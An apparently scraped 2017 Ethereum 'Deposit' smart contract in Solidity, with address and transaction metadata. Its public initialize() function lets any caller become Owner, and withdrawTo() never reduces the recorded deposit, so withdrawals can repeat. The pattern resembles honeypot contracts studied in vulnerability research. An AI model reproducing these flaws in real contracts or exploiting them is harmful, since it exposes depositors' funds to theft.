
//Address: 0x625f220be6440c14f3481072f1cbe9a83a58ec75
//Contract name: Deposit
//Balance: 0 Ether
//Verification Date: 10/8/2017
//Transacion Count: 4

// CODE STARTS HERE

pragma solidity ^0.4.15;

contract Deposit {
    address public Owner;
    
    mapping (address => uint) public deposits;
    
    uint public ReleaseDate;
    bool public Locked;
    
    event Initialized();
    event Deposit(uint Amount);
    event Withdrawal(uint Amount);
    event ReleaseDate(uint date);
    
    function initialize() payable {
        Owner = msg.sender;
        ReleaseDate = 0;
        Locked = false;
        Initialized();
    }

    function setReleaseDate(uint date) public payable {
        if (isOwner() && !Locked) {
            ReleaseDate = date;
            Locked = true;
            ReleaseDate(date);
        }
    }

    function() payable { revert(); } // call deposit()
    
    function deposit() public payable {
        if (msg.value >= 0.25 ether) {
            deposits[msg.sender] += msg.value;
            Deposit(msg.value);
        }
    }

    function withdraw(uint amount) public payable {
        withdrawTo(msg.sender, amount);
    }
    
    function withdrawTo(address to, uint amount) public payable {
        if (isOwner() && isReleasable()) {
            uint withdrawMax = deposits[msg.sender];
            if (withdrawMax > 0 && amount <= withdrawMax) {
                to.transfer(amount);
                Withdrawal(amount);
            }
        }
    }

    function isReleasable() public constant returns (bool) { return now >= ReleaseDate; }
    function isOwner() public constant returns (bool) { return Owner == msg.sender; }
}
